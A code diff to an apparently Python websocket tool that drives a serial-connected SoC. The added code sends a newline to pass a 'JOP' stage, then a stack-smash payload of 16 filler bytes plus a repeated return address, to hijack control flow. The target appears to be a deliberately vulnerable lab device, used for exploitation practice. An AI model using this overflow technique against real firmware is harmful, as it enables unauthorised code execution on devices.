@@ -208,10 +208,26 @@ async def ws_handler(websocket):
                                 print("[!] ERROR: Target address not snooped yet!")
                                 continue
 
-                            print(f"[\033[93m*\033[0m] Injecting ROP Stack Smash -> 0x{rop_target_address:x}")
-                            payload = b"A" * 16
+                            # --- STEP 1: CLEAR JOP PHASE ---
+                            # We send a newline to proceed through the JOP input loop 
+                            # without corrupting the 'action' pointer.
+                            print(f"[\033[94m*\033[0m] Phase 1: Sending dummy JOP bypass...")
+                            ser.write(b"\n")
+                            ser.flush()
+
+                            # --- STEP 2: WAIT FOR ROP PROMPT ---
+                            # Give the SoC a moment to process and print the ROP prompt
+                            await asyncio.sleep(0.3) 
+
+                            # --- STEP 3: SMASH THE STACK ---
+                            print(f"[\033[93m*\033[0m] Phase 2: Injecting ROP Stack Smash -> 0x{rop_target_address:x}")
+                            
+                            # 16 bytes to fill 'buffer[16]' 
+                            # Followed by the target address repeated to overwrite the return address
+                            payload = b"A" * 16 
                             for _ in range(24):
                                 payload += struct.pack("<I", rop_target_address)
+                            
                             payload += b"\n"
                             ser.write(payload)
                             ser.flush()
